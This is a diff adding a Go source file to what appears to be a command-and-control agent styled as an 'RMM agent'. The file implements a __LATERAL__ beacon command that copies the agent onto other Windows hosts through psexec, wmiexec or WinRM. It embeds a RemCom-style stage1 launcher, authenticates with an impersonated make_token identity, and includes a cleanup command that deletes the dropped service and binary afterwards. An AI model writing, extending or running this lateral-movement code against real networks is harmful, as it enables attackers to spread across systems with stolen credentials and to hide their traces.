@@ -1,0 +1,241 @@
+package main
+
+import (
+	"context"
+	_ "embed"
+	"encoding/json"
+	"errors"
+	"fmt"
+	"os"
+	"regexp"
+	"runtime"
+	"strings"
+	"sync"
+	"time"
+)
+
+// embeddedStage1 carries the compact stage1 launcher binary inside this
+// agent, the way RemCom embeds its service and extracts it at runtime.
+// The placeholder is replaced by the real launcher when the server builds
+// the agent (see build_go_agent in server_rmm.py).
+//
+//go:embed stage1.bin
+var embeddedStage1 []byte
+
+// lateralPayload carries the lateral movement request as a JSON body on the
+// __LATERAL__ beacon command, mirroring __MAKE_TOKEN__.
+type lateralPayload struct {
+	Method         string  `json:"method"`
+	Host           string  `json:"host"`
+	SessionID      string  `json:"session_id"`
+	WorkspaceID    *string `json:"workspace_id,omitempty"`
+	RemoteName     string  `json:"remote_name"`
+	Stage          string  `json:"stage"`
+	TimeoutSeconds float64 `json:"timeout_seconds"`
+}
+
+var lateralMethods = map[string]bool{
+	"psexec":  true,
+	"wmiexec": true,
+	"winrm":   true,
+}
+
+// The staged binary name becomes part of the service binPath, so it must be a
+// simple filename without spaces or separators.
+var lateralRemoteNamePattern = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,63}\.exe$`)
+
+func parseLateralPayload(command string) (lateralPayload, error) {
+	var payload lateralPayload
+	parts := strings.SplitN(command, "\n", 2)
+	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
+		return payload, errors.New("missing JSON payload")
+	}
+	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
+		return payload, err
+	}
+	payload.Method = strings.ToLower(strings.TrimSpace(payload.Method))
+	payload.Host = strings.Trim(strings.TrimSpace(payload.Host), `\`)
+	payload.RemoteName = strings.TrimSpace(payload.RemoteName)
+	if payload.RemoteName == "" {
+		payload.RemoteName = "minimal-rmm-agent.exe"
+	}
+	if !lateralMethods[payload.Method] {
+		return payload, errors.New("method must be one of psexec, wmiexec, winrm")
+	}
+	if payload.SessionID != "" && !regexp.MustCompile(`^[A-Za-z0-9_-]{8,128}$`).MatchString(payload.SessionID) {
+		return payload, errors.New("invalid target session id")
+	}
+	if payload.WorkspaceID != nil && *payload.WorkspaceID != "" && !agentWorkspaceIDPattern.MatchString(*payload.WorkspaceID) {
+		return payload, errors.New("invalid workspace id")
+	}
+	if payload.Host == "" {
+		return payload, errors.New("host is required")
+	}
+	if payload.Method == "psexec" {
+		// The psexec module pushes the embedded stage1 launcher, whose only
+		// capability is the staging reference created by the listener.
+		if !agentSessionIDPattern.MatchString(payload.Stage) {
+			return payload, errors.New("psexec requires a staging reference from the listener")
+		}
+	}
+	if !lateralRemoteNamePattern.MatchString(payload.RemoteName) {
+		return payload, errors.New("remote_name must be a simple .exe filename")
+	}
+	if payload.TimeoutSeconds <= 0 {
+		payload.TimeoutSeconds = 300
+	}
+	if payload.TimeoutSeconds > 3600 {
+		payload.TimeoutSeconds = 3600
+	}
+	return payload, nil
+}
+
+// lateralCommand handles __LATERAL__: start a copy of this agent on another
+// host through the requested execution method. The work runs in a bounded
+// child process so the synchronous command loop is never blocked forever,
+// and so an active make_token identity — applied through applyCommandToken —
+// governs the SMB, SCM, WMI, and WinRM authentication of the move.
+func lateralCommand(command string) (string, error) {
+	payload, err := parseLateralPayload(command)
+	if err != nil {
+		return "", err
+	}
+	if runtime.GOOS != "windows" {
+		return "", errors.New("lateral movement requires the Windows agent build")
+	}
+	self, err := os.Executable()
+	if err != nil {
+		return "", fmt.Errorf("resolve agent executable: %w", err)
+	}
+	encoded, err := json.Marshal(payload)
+	if err != nil {
+		return "", err
+	}
+	ctx, cancel := context.WithTimeout(agentContext, time.Duration(payload.TimeoutSeconds*float64(time.Second)))
+	defer cancel()
+	child := newBoundedCommand(ctx, self, "--lateral-child", string(encoded))
+	applyCommandToken(child)
+	out, err := child.CombinedOutput()
+	if ctx.Err() == context.DeadlineExceeded {
+		return "", errors.New("lateral move timed out; the target may still have started the agent")
+	}
+	if err != nil {
+		if message := strings.TrimSpace(string(out)); message != "" {
+			return "", errors.New(message)
+		}
+		return "", fmt.Errorf("lateral child failed: %w", err)
+	}
+	result := strings.TrimSpace(string(out))
+	rememberLateralCleanup(payload, result)
+	return result, nil
+}
+
+// lateralCleanupPayload identifies the deployment artifacts a psexec move
+// left on the target: the temporary service and the stage1 launcher binary.
+type lateralCleanupPayload struct {
+	Host        string `json:"host"`
+	ServiceName string `json:"service_name"`
+	BinaryName  string `json:"binary_name"`
+}
+
+// Cleanup authority belongs to this source process, not to caller-supplied
+// names. After restart or an unacknowledged launch, cleanup fails closed.
+var lateralCleanupOwners = struct {
+	sync.Mutex
+	artifacts map[lateralCleanupPayload]bool
+}{artifacts: make(map[lateralCleanupPayload]bool)}
+
+var lateralCleanupNames = regexp.MustCompile(`^service=(MinimalRmmAgent-([a-f0-9]{32})) binary=([A-Za-z0-9][A-Za-z0-9._-]*\.exe)$`)
+
+// rememberLateralCleanup records only the exact acknowledged psexec artifacts
+// returned by our child for this request, including their shared random suffix.
+func rememberLateralCleanup(request lateralPayload, result string) {
+	if request.Method != "psexec" || request.SessionID == "" {
+		return
+	}
+	prefix := fmt.Sprintf("lateral started: method=psexec host=%s target session=%s ", request.Host, request.SessionID)
+	if !strings.HasPrefix(result, prefix) {
+		return
+	}
+	match := lateralCleanupNames.FindStringSubmatch(strings.TrimPrefix(result, prefix))
+	if match == nil || match[3] != strings.TrimSuffix(request.RemoteName, ".exe")+"-"+match[2]+".exe" {
+		return
+	}
+	artifact := lateralCleanupPayload{Host: request.Host, ServiceName: match[1], BinaryName: match[3]}
+	lateralCleanupOwners.Lock()
+	defer lateralCleanupOwners.Unlock()
+	lateralCleanupOwners.artifacts[artifact] = true
+}
+
+// ownsLateralCleanup requires an exact deployment record before any deletion.
+func ownsLateralCleanup(payload lateralCleanupPayload) bool {
+	lateralCleanupOwners.Lock()
+	defer lateralCleanupOwners.Unlock()
+	return lateralCleanupOwners.artifacts[payload]
+}
+
+func parseLateralCleanupPayload(command string) (lateralCleanupPayload, error) {
+	var payload lateralCleanupPayload
+	parts := strings.SplitN(command, "\n", 2)
+	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
+		return payload, errors.New("missing JSON payload")
+	}
+	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
+		return payload, err
+	}
+	payload.Host = strings.Trim(strings.TrimSpace(payload.Host), `\`)
+	if payload.Host == "" {
+		return payload, errors.New("host is required")
+	}
+	if !regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$`).MatchString(payload.ServiceName) {
+		return payload, errors.New("invalid service name")
+	}
+	if !lateralRemoteNamePattern.MatchString(payload.BinaryName) {
+		return payload, errors.New("invalid binary name")
+	}
+	return payload, nil
+}
+
+// lateralCleanupCommand handles __LATERAL_CLEANUP__ after a psexec move: it
+// runs in a bounded child (with the active make_token identity through
+// applyCommandToken) that deletes the temporary launcher service and the
+// stage1 binary on the target once the agent is running.
+func lateralCleanupCommand(command string) (string, error) {
+	payload, err := parseLateralCleanupPayload(command)
+	if err != nil {
+		return "", err
+	}
+	if runtime.GOOS != "windows" {
+		return "", errors.New("lateral movement requires the Windows agent build")
+	}
+	if !ownsLateralCleanup(payload) {
+		return "", errors.New("cleanup artifacts are not owned by an acknowledged deployment in this agent process")
+	}
+	self, err := os.Executable()
+	if err != nil {
+		return "", fmt.Errorf("resolve agent executable: %w", err)
+	}
+	encoded, err := json.Marshal(payload)
+	if err != nil {
+		return "", err
+	}
+	ctx, cancel := context.WithTimeout(agentContext, 2*time.Minute)
+	defer cancel()
+	child := newBoundedCommand(ctx, self, "--lateral-cleanup-child", string(encoded))
+	applyCommandToken(child)
+	out, err := child.CombinedOutput()
+	if err != nil {
+		if message := strings.TrimSpace(string(out)); message != "" {
+			return "", errors.New(message)
+		}
+		return "", fmt.Errorf("lateral cleanup child failed: %w", err)
+	}
+	result := strings.TrimSpace(string(out))
+	if !strings.HasPrefix(result, "lateral cleanup: ") {
+		return "", fmt.Errorf("cleanup did not confirm success: %s", result)
+	}
+	lateralCleanupOwners.Lock()
+	delete(lateralCleanupOwners.artifacts, payload)
+	lateralCleanupOwners.Unlock()
+	return result, nil
+}
